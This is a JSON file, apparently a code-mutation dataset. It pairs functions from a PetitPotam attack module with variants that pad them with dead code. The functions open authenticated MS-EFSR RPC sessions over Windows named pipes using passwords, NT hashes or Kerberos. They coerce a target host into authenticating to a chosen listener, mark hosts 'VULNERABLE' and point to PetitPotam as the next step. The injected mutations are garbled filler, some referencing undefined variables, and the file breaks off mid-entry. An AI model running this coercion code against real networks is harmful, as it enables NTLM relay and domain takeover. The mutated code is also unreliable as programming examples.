[
    {
        "func_name": "options",
        "original": "def options(self, context, module_options):\n    \"\"\"\n        LISTENER            IP of your listener\n        PIPE                Default PIPE (default: lsarpc)\n        \"\"\"\n    self.listener = '127.0.0.1'\n    if 'LISTENER' in module_options:\n        self.listener = module_options['LISTENER']\n    self.pipe = 'lsarpc'\n    if 'PIPE' in module_options:\n        self.pipe = module_options['PIPE']",
        "mutated": [
            "def options(self, context, module_options):\n    if False:\n        i = 10\n    '\\n        LISTENER            IP of your listener\\n        PIPE                Default PIPE (default: lsarpc)\\n        '\n    self.listener = '127.0.0.1'\n    if 'LISTENER' in module_options:\n        self.listener = module_options['LISTENER']\n    self.pipe = 'lsarpc'\n    if 'PIPE' in module_options:\n        self.pipe = module_options['PIPE']",
            "def options(self, context, module_options):\n    if False:\n        i = 10\n        while True:\n            print('Mutation')\n    '\\n        LISTENER            IP of your listener\\n        PIPE                Default PIPE (default: lsarpc)\\n        '\n    self.listener = '127.0.0.1'\n    if 'LISTENER' in module_options:\n        self.listener = module_options['LISTENER']\n    self.pipe = 'lsarpc'\n    if 'PIPE' in module_options:\n        self.pipe = module_options['PIPE']",
            "def options(self, context, module_options):\n    if False:\n        i = 10\n        while True:\n            print('Mutation')\n        n = 10\n        dp = [0, 1]\n        for i in range(2, n + 1):\n            dp.append(dp[i - 1] + dp[i - 2])\n        print(dp[n])\n    '\\n        LISTENER            IP of your listener\\n        PIPE                Default PIPE (default: lsarpc)\\n        '\n    self.listener = '127.0.0.1'\n    if 'LISTENER' in module_options:\n        self.listener = module_options['LISTENER']\n    self.pipe = 'lsarpc'\n    if 'PIPE' in module_options:\n        self.pipe = module_options['PIPE']",
            "def options(self, context, module_options):\n    if False:\n        i = 10\n        while True:\n            print('Mutation')\n        n = 10\n        dp = [0, 1]\n        for i in range(2, n + 1):\n            dp.append(dp[i - 1] + dp[i - 2])\n        print(dp[n])\n\n        def dfs(node):\n            if node == None:\n                return []\n            left = dfs(node.left)\n            right = dfs(node.right)\n    '\\n        LISTENER            IP of your listener\\n        PIPE                Default PIPE (default: lsarpc)\\n        '\n    self.listener = '127.0.0.1'\n    if 'LISTENER' in module_options:\n        self.listener = module_options['LISTENER']\n    self.pipe = 'lsarpc'\n    if 'PIPE' in module_options:\n        self.pipe = module_options['PIPE']",
            "def options(self, context, module_options):\n    if False:\n        i = 10\n        while True:\n            print('Mutation')\n        dp = [0, 1]\n        for i in range(2, n + 1):\n            dp.append(dp[i - 1] + dp[i - 2])\n        print(dp[n])\n\n        def dfs(node):\n            if node == None:\n                return []\n            left = dfs(node.left)\n            right = dfs(node.right)\n        length = 15\n        if length <= 0:\n            return []\n        elif length == 1:\n            return [0]\n        sequence = [0, 1]\n        while len(sequence) < length:\n            next_value = sequence[-1] + sequence[-2]\n            sequence.append(next_value)\n        return sequence\n    '\\n        LISTENER            IP of your listener\\n        PIPE                Default PIPE (default: lsarpc)\\n        '\n    self.listener = '127.0.0.1'\n    if 'LISTENER' in module_options:\n        self.listener = module_options['LISTENER']\n    self.pipe = 'lsarpc'\n    if 'PIPE' in module_options:\n        self.pipe = module_options['PIPE']"
        ]
    },
    {
        "func_name": "on_login",
        "original": "def on_login(self, context, connection):\n    dce = coerce(connection.username, password=connection.password, domain=connection.domain, lmhash=connection.lmhash, nthash=connection.nthash, aesKey=connection.aesKey, target=connection.host if not connection.kerberos else connection.hostname + '.' + connection.domain, pipe=self.pipe, do_kerberos=connection.kerberos, dc_host=connection.kdcHost, target_ip=connection.host, context=context)\n    if efs_rpc_open_file_raw(dce, self.listener, context):\n        context.log.highlight('VULNERABLE')\n        context.log.highlight('Next step: https://github.com/topotam/PetitPotam')\n        try:\n            host = context.db.get_hosts(connection.host)[0]\n            context.db.add_host(host.ip, host.hostname, host.domain, host.os, host.smbv1, host.signing, petitpotam=True)\n        except Exception as e:\n            context.log.debug(f'Error updating petitpotam status in database')",
        "mutated": [
            "def on_login(self, context, connection):\n    if False:\n        i = 10\n    dce = coerce(connection.username, password=connection.password, domain=connection.domain, lmhash=connection.lmhash, nthash=connection.nthash, aesKey=connection.aesKey, target=connection.host if not connection.kerberos else connection.hostname + '.' + connection.domain, pipe=self.pipe, do_kerberos=connection.kerberos, dc_host=connection.kdcHost, target_ip=connection.host, context=context)\n    if efs_rpc_open_file_raw(dce, self.listener, context):\n        context.log.highlight('VULNERABLE')\n        context.log.highlight('Next step: https://github.com/topotam/PetitPotam')\n        try:\n            host = context.db.get_hosts(connection.host)[0]\n            context.db.add_host(host.ip, host.hostname, host.domain, host.os, host.smbv1, host.signing, petitpotam=True)\n        except Exception as e:\n            context.log.debug(f'Error updating petitpotam status in database')",
            "def on_login(self, context, connection):\n    if False:\n        i = 10\n        while True:\n            print('Mutation')\n    dce = coerce(connection.username, password=connection.password, domain=connection.domain, lmhash=connection.lmhash, nthash=connection.nthash, aesKey=connection.aesKey, target=connection.host if not connection.kerberos else connection.hostname + '.' + connection.domain, pipe=self.pipe, do_kerberos=connection.kerberos, dc_host=connection.kdcHost, target_ip=connection.host, context=context)\n    if efs_rpc_open_file_raw(dce, self.listener, context):\n        context.log.highlight('VULNERABLE')\n        context.log.highlight('Next step: https://github.com/topotam/PetitPotam')\n        try:\n            host = context.db.get_hosts(connection.host)[0]\n            context.db.add_host(host.ip, host.hostname, host.domain, host.os, host.smbv1, host.signing, petitpotam=True)\n        except Exception as e:\n            context.log.debug(f'Error updating petitpotam status in database')",
            "def on_login(self, context, connection):\n    if False:\n        i = 10\n        while True:\n            print('Mutation')\n        n = 10\n        dp = [0, 1]\n        for i in range(2, n + 1):\n            dp.append(dp[i - 1] + dp[i - 2])\n        print(dp[n])\n    dce = coerce(connection.username, password=connection.password, domain=connection.domain, lmhash=connection.lmhash, nthash=connection.nthash, aesKey=connection.aesKey, target=connection.host if not connection.kerberos else connection.hostname + '.' + connection.domain, pipe=self.pipe, do_kerberos=connection.kerberos, dc_host=connection.kdcHost, target_ip=connection.host, context=context)\n    if efs_rpc_open_file_raw(dce, self.listener, context):\n        context.log.highlight('VULNERABLE')\n        context.log.highlight('Next step: https://github.com/topotam/PetitPotam')\n        try:\n            host = context.db.get_hosts(connection.host)[0]\n            context.db.add_host(host.ip, host.hostname, host.domain, host.os, host.smbv1, host.signing, petitpotam=True)\n        except Exception as e:\n            context.log.debug(f'Error updating petitpotam status in database')",
            "def on_login(self, context, connection):\n    if False:\n        i = 10\n        while True:\n            print('Mutation')\n        n = 10\n        dp = [0, 1]\n        for i in range(2, n + 1):\n            dp.append(dp[i - 1] + dp[i - 2])\n        print(dp[n])\n\n        def dfs(node):\n            if node == None:\n                return []\n            left = dfs(node.left)\n            right = dfs(node.right)\n    dce = coerce(connection.username, password=connection.password, domain=connection.domain, lmhash=connection.lmhash, nthash=connection.nthash, aesKey=connection.aesKey, target=connection.host if not connection.kerberos else connection.hostname + '.' + connection.domain, pipe=self.pipe, do_kerberos=connection.kerberos, dc_host=connection.kdcHost, target_ip=connection.host, context=context)\n    if efs_rpc_open_file_raw(dce, self.listener, context):\n        context.log.highlight('VULNERABLE')\n        context.log.highlight('Next step: https://github.com/topotam/PetitPotam')\n        try:\n            host = context.db.get_hosts(connection.host)[0]\n            context.db.add_host(host.ip, host.hostname, host.domain, host.os, host.smbv1, host.signing, petitpotam=True)\n        except Exception as e:\n            context.log.debug(f'Error updating petitpotam status in database')",
            "def on_login(self, context, connection):\n    if False:\n        i = 10\n        while True:\n            print('Mutation')\n        dp = [0, 1]\n        for i in range(2, n + 1):\n            dp.append(dp[i - 1] + dp[i - 2])\n        print(dp[n])\n\n        def dfs(node):\n            if node == None:\n                return []\n            left = dfs(node.left)\n            right = dfs(node.right)\n        length = 15\n        if length <= 0:\n            return []\n        elif length == 1:\n            return [0]\n        sequence = [0, 1]\n        while len(sequence) < length:\n            next_value = sequence[-1] + sequence[-2]\n            sequence.append(next_value)\n        return sequence\n    dce = coerce(connection.username, password=connection.password, domain=connection.domain, lmhash=connection.lmhash, nthash=connection.nthash, aesKey=connection.aesKey, target=connection.host if not connection.kerberos else connection.hostname + '.' + connection.domain, pipe=self.pipe, do_kerberos=connection.kerberos, dc_host=connection.kdcHost, target_ip=connection.host, context=context)\n    if efs_rpc_open_file_raw(dce, self.listener, context):\n        context.log.highlight('VULNERABLE')\n        context.log.highlight('Next step: https://github.com/topotam/PetitPotam')\n        try:\n            host = context.db.get_hosts(connection.host)[0]\n            context.db.add_host(host.ip, host.hostname, host.domain, host.os, host.smbv1, host.signing, petitpotam=True)\n        except Exception as e:\n            context.log.debug(f'Error updating petitpotam status in database')"
        ]
    },
    {
        "func_name": "__init__",
        "original": "def __init__(self, error_string=None, error_code=None, packet=None):\n    DCERPCException.__init__(self, error_string, error_code, packet)",
        "mutated": [
            "def __init__(self, error_string=None, error_code=None, packet=None):\n    if False:\n        i = 10\n    DCERPCException.__init__(self, error_string, error_code, packet)",
            "def __init__(self, error_string=None, error_code=None, packet=None):\n    if False:\n        i = 10\n        while True:\n            print('Mutation')\n    DCERPCException.__init__(self, error_string, error_code, packet)",
            "def __init__(self, error_string=None, error_code=None, packet=None):\n    if False:\n        i = 10\n        while True:\n            print('Mutation')\n        n = 10\n        dp = [0, 1]\n        for i in range(2, n + 1):\n            dp.append(dp[i - 1] + dp[i - 2])\n        print(dp[n])\n    DCERPCException.__init__(self, error_string, error_code, packet)",
            "def __init__(self, error_string=None, error_code=None, packet=None):\n    if False:\n        i = 10\n        while True:\n            print('Mutation')\n        n = 10\n        dp = [0, 1]\n        for i in range(2, n + 1):\n            dp.append(dp[i - 1] + dp[i - 2])\n        print(dp[n])\n\n        def dfs(node):\n            if node == None:\n                return []\n            left = dfs(node.left)\n            right = dfs(node.right)\n    DCERPCException.__init__(self, error_string, error_code, packet)",
            "def __init__(self, error_string=None, error_code=None, packet=None):\n    if False:\n        i = 10\n        while True:\n            print('Mutation')\n        dp = [0, 1]\n        for i in range(2, n + 1):\n            dp.append(dp[i - 1] + dp[i - 2])\n        print(dp[n])\n\n        def dfs(node):\n            if node == None:\n                return []\n            left = dfs(node.left)\n            right = dfs(node.right)\n        length = 15\n        if length <= 0:\n            return []\n        elif length == 1:\n            return [0]\n        sequence = [0, 1]\n        while len(sequence) < length:\n            next_value = sequence[-1] + sequence[-2]\n            sequence.append(next_value)\n        return sequence\n    DCERPCException.__init__(self, error_string, error_code, packet)"
        ]
    },
    {
        "func_name": "__str__",
        "original": "def __str__(self):\n    key = self.error_code\n    if key in system_errors.ERROR_MESSAGES:\n        error_msg_short = system_errors.ERROR_MESSAGES[key][0]\n        error_msg_verbose = system_errors.ERROR_MESSAGES[key][1]\n        return 'EFSR SessionError: code: 0x%x - %s - %s' % (self.error_code, error_msg_short, error_msg_verbose)\n    else:\n        return 'EFSR SessionError: unknown error code: 0x%x' % self.error_code",
        "mutated": [
            "def __str__(self):\n    if False:\n        i = 10\n    key = self.error_code\n    if key in system_errors.ERROR_MESSAGES:\n        error_msg_short = system_errors.ERROR_MESSAGES[key][0]\n        error_msg_verbose = system_errors.ERROR_MESSAGES[key][1]\n        return 'EFSR SessionError: code: 0x%x - %s - %s' % (self.error_code, error_msg_short, error_msg_verbose)\n    else:\n        return 'EFSR SessionError: unknown error code: 0x%x' % self.error_code",
            "def __str__(self):\n    if False:\n        i = 10\n        while True:\n            print('Mutation')\n    key = self.error_code\n    if key in system_errors.ERROR_MESSAGES:\n        error_msg_short = system_errors.ERROR_MESSAGES[key][0]\n        error_msg_verbose = system_errors.ERROR_MESSAGES[key][1]\n        return 'EFSR SessionError: code: 0x%x - %s - %s' % (self.error_code, error_msg_short, error_msg_verbose)\n    else:\n        return 'EFSR SessionError: unknown error code: 0x%x' % self.error_code",
            "def __str__(self):\n    if False:\n        i = 10\n        while True:\n            print('Mutation')\n        n = 10\n        dp = [0, 1]\n        for i in range(2, n + 1):\n            dp.append(dp[i - 1] + dp[i - 2])\n        print(dp[n])\n    key = self.error_code\n    if key in system_errors.ERROR_MESSAGES:\n        error_msg_short = system_errors.ERROR_MESSAGES[key][0]\n        error_msg_verbose = system_errors.ERROR_MESSAGES[key][1]\n        return 'EFSR SessionError: code: 0x%x - %s - %s' % (self.error_code, error_msg_short, error_msg_verbose)\n    else:\n        return 'EFSR SessionError: unknown error code: 0x%x' % self.error_code",
            "def __str__(self):\n    if False:\n        i = 10\n        while True:\n            print('Mutation')\n        n = 10\n        dp = [0, 1]\n        for i in range(2, n + 1):\n            dp.append(dp[i - 1] + dp[i - 2])\n        print(dp[n])\n\n        def dfs(node):\n            if node == None:\n                return []\n            left = dfs(node.left)\n            right = dfs(node.right)\n    key = self.error_code\n    if key in system_errors.ERROR_MESSAGES:\n        error_msg_short = system_errors.ERROR_MESSAGES[key][0]\n        error_msg_verbose = system_errors.ERROR_MESSAGES[key][1]\n        return 'EFSR SessionError: code: 0x%x - %s - %s' % (self.error_code, error_msg_short, error_msg_verbose)\n    else:\n        return 'EFSR SessionError: unknown error code: 0x%x' % self.error_code",
            "def __str__(self):\n    if False:\n        i = 10\n        while True:\n            print('Mutation')\n        dp = [0, 1]\n        for i in range(2, n + 1):\n            dp.append(dp[i - 1] + dp[i - 2])\n        print(dp[n])\n\n        def dfs(node):\n            if node == None:\n                return []\n            left = dfs(node.left)\n            right = dfs(node.right)\n        length = 15\n        if length <= 0:\n            return []\n        elif length == 1:\n            return [0]\n        sequence = [0, 1]\n        while len(sequence) < length:\n            next_value = sequence[-1] + sequence[-2]\n            sequence.append(next_value)\n        return sequence\n    key = self.error_code\n    if key in system_errors.ERROR_MESSAGES:\n        error_msg_short = system_errors.ERROR_MESSAGES[key][0]\n        error_msg_verbose = system_errors.ERROR_MESSAGES[key][1]\n        return 'EFSR SessionError: code: 0x%x - %s - %s' % (self.error_code, error_msg_short, error_msg_verbose)\n    else:\n        return 'EFSR SessionError: unknown error code: 0x%x' % self.error_code"
        ]
    },
    {
        "func_name": "coerce",
        "original": "def coerce(username, password, domain, lmhash, nthash, aesKey, target, pipe, do_kerberos, dc_host, target_ip=None, context=None):\n    binding_params = {'lsarpc': {'stringBinding': 'ncacn_np:%s[\\\\PIPE\\\\lsarpc]' % target, 'MSRPC_UUID_EFSR': ('c681d488-d850-11d0-8c52-00c04fd90f7e', '1.0')}, 'efsr': {'stringBinding': 'ncacn_np:%s[\\\\PIPE\\\\efsrpc]' % target, 'MSRPC_UUID_EFSR': ('df1941c5-fe89-4e79-bf10-463657acf44d', '1.0')}, 'samr': {'stringBinding': 'ncacn_np:%s[\\\\PIPE\\\\samr]' % target, 'MSRPC_UUID_EFSR': ('c681d488-d850-11d0-8c52-00c04fd90f7e', '1.0')}, 'lsass': {'stringBinding': 'ncacn_np:%s[\\\\PIPE\\\\lsass]' % target, 'MSRPC_UUID_EFSR': ('c681d488-d850-11d0-8c52-00c04fd90f7e', '1.0')}, 'netlogon': {'stringBinding': 'ncacn_np:%s[\\\\PIPE\\\\netlogon]' % target, 'MSRPC_UUID_EFSR': ('c681d488-d850-11d0-8c52-00c04fd90f7e', '1.0')}}\n    rpc_transport = transport.DCERPCTransportFactory(binding_params[pipe]['stringBinding'])\n    if hasattr(rpc_transport, 'set_credentials'):\n        rpc_transport.set_credentials(username=username, password=password, domain=domain, lmhash=lmhash, nthash=nthash, aesKey=aesKey)\n    if target_ip:\n        rpc_transport.setRemoteHost(target_ip)\n    dce = rpc_transport.get_dce_rpc()\n    dce.set_auth_type(RPC_C_AUTHN_WINNT)\n    dce.set_auth_level(RPC_C_AUTHN_LEVEL_PKT_PRIVACY)\n    if do_kerberos:\n        rpc_transport.set_kerberos(do_kerberos, kdcHost=dc_host)\n        dce.set_auth_type(RPC_C_AUTHN_GSS_NEGOTIATE)\n    context.log.info('[-] Connecting to %s' % binding_params[pipe]['stringBinding'])\n    try:\n        dce.connect()\n    except Exception as e:\n        context.log.debug('Something went wrong, check error status => %s' % str(e))\n        sys.exit()\n    context.log.info('[+] Connected!')\n    context.log.info('[+] Binding to %s' % binding_params[pipe]['MSRPC_UUID_EFSR'][0])\n    try:\n        dce.bind(uuidtup_to_bin(binding_params[pipe]['MSRPC_UUID_EFSR']))\n    except Exception as e:\n        context.log.debug('Something went wrong, check error status => %s' % str(e))\n        sys.exit()\n    context.log.info('[+] Successfully bound!')\n    return dce",
        "mutated": [
            "def coerce(username, password, domain, lmhash, nthash, aesKey, target, pipe, do_kerberos, dc_host, target_ip=None, context=None):\n    if False:\n        i = 10\n    binding_params = {'lsarpc': {'stringBinding': 'ncacn_np:%s[\\\\PIPE\\\\lsarpc]' % target, 'MSRPC_UUID_EFSR': ('c681d488-d850-11d0-8c52-00c04fd90f7e', '1.0')}, 'efsr': {'stringBinding': 'ncacn_np:%s[\\\\PIPE\\\\efsrpc]' % target, 'MSRPC_UUID_EFSR': ('df1941c5-fe89-4e79-bf10-463657acf44d', '1.0')}, 'samr': {'stringBinding': 'ncacn_np:%s[\\\\PIPE\\\\samr]' % target, 'MSRPC_UUID_EFSR': ('c681d488-d850-11d0-8c52-00c04fd90f7e', '1.0')}, 'lsass': {'stringBinding': 'ncacn_np:%s[\\\\PIPE\\\\lsass]' % target, 'MSRPC_UUID_EFSR': ('c681d488-d850-11d0-8c52-00c04fd90f7e', '1.0')}, 'netlogon': {'stringBinding': 'ncacn_np:%s[\\\\PIPE\\\\netlogon]' % target, 'MSRPC_UUID_EFSR': ('c681d488-d850-11d0-8c52-00c04fd90f7e', '1.0')}}\n    rpc_transport = transport.DCERPCTransportFactory(binding_params[pipe]['stringBinding'])\n    if hasattr(rpc_transport, 'set_credentials'):\n        rpc_transport.set_credentials(username=username, password=password, domain=domain, lmhash=lmhash, nthash=nthash, aesKey=aesKey)\n    if target_ip:\n        rpc_transport.setRemoteHost(target_ip)\n    dce = rpc_transport.get_dce_rpc()\n    dce.set_auth_type(RPC_C_AUTHN_WINNT)\n    dce.set_auth_level(RPC_C_AUTHN_LEVEL_PKT_PRIVACY)\n    if do_kerberos:\n        rpc_transport.set_kerberos(do_kerberos, kdcHost=dc_host)\n        dce.set_auth_type(RPC_C_AUTHN_GSS_NEGOTIATE)\n    context.log.info('[-] Connecting to %s' % binding_params[pipe]['stringBinding'])\n    try:\n        dce.connect()\n    except Exception as e:\n        context.log.debug('Something went wrong, check error status => %s' % str(e))\n        sys.exit()\n    context.log.info('[+] Connected!')\n    context.log.info('[+] Binding to %s' % binding_params[pipe]['MSRPC_UUID_EFSR'][0])\n    try:\n        dce.bind(uuidtup_to_bin(binding_params[pipe]['MSRPC_UUID_EFSR']))\n    except Exception as e:\n        context.log.debug('Something went wrong, check error status => %s' % str(e))\n        sys.exit()\n    context.log.info('[+] Successfully bound!')\n    return dce",
            "def coerce(username, password, domain, lmhash, nthash, aesKey, target, pipe, do_kerberos, dc_host, target_ip=None, context=None):\n    if False:\n        i = 10\n        while True:\n            print('Mutation')\n    binding_params = {'lsarpc': {'stringBinding': 'ncacn_np:%s[\\\\PIPE\\\\lsarpc]' % target, 'MSRPC_UUID_EFSR': ('c681d488-d850-11d0-8c52-00c04fd90f7e', '1.0')}, 'efsr': {'stringBinding': 'ncacn_np:%s[\\\\PIPE\\\\efsrpc]' % target, 'MSRPC_UUID_EFSR': ('df1941c5-fe89-4e79-bf10-463657acf44d', '1.0')}, 'samr': {'stringBinding': 'ncacn_np:%s[\\\\PIPE\\\\samr]' % target, 'MSRPC_UUID_EFSR': ('c681d488-d850-11d0-8c52-00c04fd90f7e', '1.0')}, 'lsass': {'stringBinding': 'ncacn_np:%s[\\\\PIPE\\\\lsass]' % target, 'MSRPC_UUID_EFSR': ('c681d488-d850-11d0-8c52-00c04fd90f7e', '1.0')}, 'netlogon': {'stringBinding': 'ncacn_np:%s[\\\\PIPE\\\\netlogon]' % target, 'MSRPC_UUID_EFSR': ('c681d488-d850-11d0-8c52-00c04fd90f7e', '1.0')}}\n    rpc_transport = transport.DCERPCTransportFactory(binding_params[pipe]['stringBinding'])\n    if hasattr(rpc_transport, 'set_credentials'):\n        rpc_transport.set_credentials(username=username, password=password, domain=domain, lmhash=lmhash, nthash=nthash, aesKey=aesKey)\n    if target_ip:\n        rpc_transport.setRemoteHost(target_ip)\n    dce = rpc_transport.get_dce_rpc()\n    dce.set_auth_type(RPC_C_AUTHN_WINNT)\n    dce.set_auth_level(RPC_C_AUTHN_LEVEL_PKT_PRIVACY)\n    if do_kerberos:\n        rpc_transport.set_kerberos(do_kerberos, kdcHost=dc_host)\n        dce.set_auth_type(RPC_C_AUTHN_GSS_NEGOTIATE)\n    context.log.info('[-] Connecting to %s' % binding_params[pipe]['stringBinding'])\n    try:\n        dce.connect()\n    except Exception as e:\n        context.log.debug('Something went wrong, check error status => %s' % str(e))\n        sys.exit()\n    context.log.info('[+] Connected!')\n    context.log.info('[+] Binding to %s' % binding_params[pipe]['MSRPC_UUID_EFSR'][0])\n    try:\n        dce.bind(uuidtup_to_bin(binding_params[pipe]['MSRPC_UUID_EFSR']))\n    except Exception as e:\n        context.log.debug('Something went wrong, check error status => %s' % str(e))\n        sys.exit()\n    context.log.info('[+] Successfully bound!')\n    return dce",
            "def coerce(username, password, domain, lmhash, nthash, aesKey, target, pipe, do_kerberos, dc_host, target_ip=None, context=None):\n    if False:\n        i = 10\n        while True:\n            print('Mutation')\n        n = 10\n        dp = [0, 1]\n        for i in range(2, n + 1):\n            dp.append(dp[i - 1] + dp[i - 2])\n        print(dp[n])\n    binding_params = {'lsarpc': {'stringBinding': 'ncacn_np:%s[\\\\PIPE\\\\lsarpc]' % target, 'MSRPC_UUID_EFSR': ('c681d488-d850-11d0-8c52-00c04fd90f7e', '1.0')}, 'efsr': {'stringBinding': 'ncacn_np:%s[\\\\PIPE\\\\efsrpc]' % target, 'MSRPC_UUID_EFSR': ('df1941c5-fe89-4e79-bf10-463657acf44d', '1.0')}, 'samr': {'stringBinding': 'ncacn_np:%s[\\\\PIPE\\\\samr]' % target, 'MSRPC_UUID_EFSR': ('c681d488-d850-11d0-8c52-00c04fd90f7e', '1.0')}, 'lsass': {'stringBinding': 'ncacn_np:%s[\\\\PIPE\\\\lsass]' % target, 'MSRPC_UUID_EFSR': ('c681d488-d850-11d0-8c52-00c04fd90f7e', '1.0')}, 'netlogon': {'stringBinding': 'ncacn_np:%s[\\\\PIPE\\\\netlogon]' % target, 'MSRPC_UUID_EFSR': ('c681d488-d850-11d0-8c52-00c04fd90f7e', '1.0')}}\n    rpc_transport = transport.DCERPCTransportFactory(binding_params[pipe]['stringBinding'])\n    if hasattr(rpc_transport, 'set_credentials'):\n        rpc_transport.set_credentials(username=username, password=password, domain=domain, lmhash=lmhash, nthash=nthash, aesKey=aesKey)\n    if target_ip:\n        rpc_transport.setRemoteHost(target_ip)\n    dce = rpc_transport.get_dce_rpc()\n    dce.set_auth_type(RPC_C_AUTHN_WINNT)\n    dce.set_auth_level(RPC_C_AUTHN_LEVEL_PKT_PRIVACY)\n    if do_kerberos:\n        rpc_transport.set_kerberos(do_kerberos, kdcHost=dc_host)\n        dce.set_auth_type(RPC_C_AUTHN_GSS_NEGOTIATE)\n    context.log.info('[-] Connecting to %s' % binding_params[pipe]['stringBinding'])\n    try:\n        dce.connect()\n    except Exception as e:\n        context.log.debug('Something went wrong, check error status => %s' % str(e))\n        sys.exit()\n    context.log.info('[+] Connected!')\n    context.log.info('[+] Binding to %s' % binding_params[pipe]['MSRPC_UUID_EFSR'][0])\n    try:\n        dce.bind(uuidtup_to_bin(binding_params[pipe]['MSRPC_UUID_EFSR']))\n    except Exception as e:\n        context.log.debug('Something went wrong, check error status => %s' % str(e))\n        sys.exit()\n    context.log.info('[+] Successfully bound!')\n    return dce",
            "def coerce(username, password, domain, lmhash, nthash, aesKey, target, pipe, do_kerberos, dc_host, target_ip=None, context=None):\n    if False:\n        i = 10\n        while True:\n            print('Mutation')\n        n = 10\n        dp = [0, 1]\n        for i in range(2, n + 1):\n            dp.append(dp[i - 1] + dp[i - 2])\n        print(dp[n])\n\n        def dfs(node):\n            if node == None:\n                return []\n            left = dfs(node.left)\n            right = dfs(node.right)\n    binding_params = {'lsarpc': {'stringBinding': 'ncacn_np:%s[\\\\PIPE\\\\lsarpc]' % target, 'MSRPC_UUID_EFSR': ('c681d488-d850-11d0-8c52-00c04fd90f7e', '1.0')}, 'efsr': {'stringBinding': 'ncacn_np:%s[\\\\PIPE\\\\efsrpc]' % target, 'MSRPC_UUID_EFSR': ('df1941c5-fe89-4e79-bf10-463657acf44d', '1.0')}, 'samr': {'stringBinding': 'ncacn_np:%s[\\\\PIPE\\\\samr]' % target, 'MSRPC_UUID_EFSR': ('c681d488-d850-11d0-8c52-00c04fd90f7e', '1.0')}, 'lsass': {'stringBinding': 'ncacn_np:%s[\\\\PIPE\\\\lsass]' % target, 'MSRPC_UUID_EFSR': ('c681d488-d850-11d0-8c52-00c04fd90f7e', '1.0')}, 'netlogon': {'stringBinding': 'ncacn_np:%s[\\\\PIPE\\\\netlogon]' % target, 'MSRPC_UUID_EFSR': ('c681d488-d850-11d0-8c52-00c04fd90f7e', '1.0')}}\n    rpc_transport = transport.DCERPCTransportFactory(binding_params[pipe]['stringBinding'])\n    if hasattr(rpc_transport, 'set_credentials'):\n        rpc_transport.set_credentials(username=username, password=password, domain=domain, lmhash=lmhash, nthash=nthash, aesKey=aesKey)\n    if target_ip:\n        rpc_transport.setRemoteHost(target_ip)\n    dce = rpc_transport.get_dce_rpc()\n    dce.set_auth_type(RPC_C_AUTHN_WINNT)\n    dce.set_auth_level(RPC_C_AUTHN_LEVEL_PKT_PRIVACY)\n    if do_kerberos:\n        rpc_transport.set_kerberos(do_kerberos, kdcHost=dc_host)\n        dce.set_auth_type(RPC_C_AUTHN_GSS_NEGOTIATE)\n    context.log.info('[-] Connecting to %s' % binding_params[pipe]['stringBinding'])\n    try:\n        dce.connect()\n    except Exception as e:\n        context.log.debug('Something went wrong, check error status => %s' % str(e))\n        sys.exit()\n    context.log.info('[+] Connected!')\n    context.log.info('[+] Binding to %s' % binding_params[pipe]['MSRPC_UUID_EFSR'][0])\n    try:\n        dce.bind(uuidtup_to_bin(binding_params[pipe]['MSRPC_UUID_EFSR']))\n    except Exception as e:\n        context.log.debug('Something went wrong, check error status => %s' % str(e))\n        sys.exit()\n    context.log.info('[+] Successfully bound!')\n    return dce",
            "def coerce(username, password, domain, lmhash, nthash, aesKey, target, pipe, do_kerberos, dc_host, target_ip=None, context=None):\n    if False:\n        i = 10\n        while True:\n            print('Mutation')\n        dp = [0, 1]\n        for i in range(2, n + 1):\n            dp.append(dp[i - 1] + dp[i - 2])\n        print(dp[n])\n\n        def dfs(node):\n            if node == None:\n                return []\n            left = dfs(node.left)\n            right = dfs(node.right)\n        length = 15\n        if length <= 0:\n            return []\n        elif length == 1:\n            return [0]\n        sequence = [0, 1]\n        while len(sequence) < length:\n            next_value = sequence[-1] + sequence[-2]\n            sequence.append(next_value)\n        return sequence\n    binding_params = {'lsarpc': {'stringBinding': 'ncacn_np:%s[\\\\PIPE\\\\lsarpc]' % target, 'MSRPC_UUID_EFSR': ('c681d488-d850-11d0-8c52-00c04fd90f7e', '1.0')}, 'efsr': {'stringBinding': 'ncacn_np:%s[\\\\PIPE\\\\efsrpc]' % target, 'MSRPC_UUID_EFSR': ('df1941c5-fe89-4e79-bf10-463657acf44d', '1.0')}, 'samr': {'stringBinding': 'ncacn_np:%s[\\\\PIPE\\\\samr]' % target, 'MSRPC_UUID_EFSR': ('c681d488-d850-11d0-8c52-00c04fd90f7e', '1.0')}, 'lsass': {'stringBinding': 'ncacn_np:%s[\\\\PIPE\\\\lsass]' % target, 'MSRPC_UUID_EFSR': ('c681d488-d850-11d0-8c52-00c04fd90f7e', '1.0')}, 'netlogon': {'stringBinding': 'ncacn_np:%s[\\\\PIPE\\\\netlogon]' % target, 'MSRPC_UUID_EFSR': ('c681d488-d850-11d0-8c52-00c04fd90f7e', '1.0')}}\n    rpc_transport = transport.DCERPCTransportFactory(binding_params[pipe]['stringBinding'])\n    if hasattr(rpc_transport, 'set_credentials'):\n        rpc_transport.set_credentials(username=username, password=password, domain=domain, lmhash=lmhash, nthash=nthash, aesKey=aesKey)\n    if target_ip:\n        rpc_transport.setRemoteHost(target_ip)\n    dce = rpc_transport.get_dce_rpc()\n    dce.set_auth_type(RPC_C_AUTHN_WINNT)\n    dce.set_auth_level(RPC_C_AUTHN_LEVEL_PKT_PRIVACY)\n    if do_kerberos:\n        rpc_transport.set_kerberos(do_kerberos, kdcHost=dc_host)\n        dce.set_auth_type(RPC_C_AUTHN_GSS_NEGOTIATE)\n    context.log.info('[-] Connecting to %s' % binding_params[pipe]['stringBinding'])\n    try:\n        dce.connect()\n    except Exception as e:\n        context.log.debug('Something went wrong, check error status => %s' % str(e))\n        sys.exit()\n    context.log.info('[+] Connected!')\n    context.log.info('[+] Binding to %s' % binding_params[pipe]['MSRPC_UUID_EFSR'][0])\n    try:\n        dce.bind(uuidtup_to_bin(binding_params[pipe]['MSRPC_UUID_EFSR']))\n    except Exception as e:\n        context.log.debug('Something went wrong, check error status => %s' % str(e))\n        sys.exit()\n    context.log.info('[+] Successfully bound!')\n    return dce"
        ]
    },
    {
        "func_name": "efs_rpc_open_file_raw",
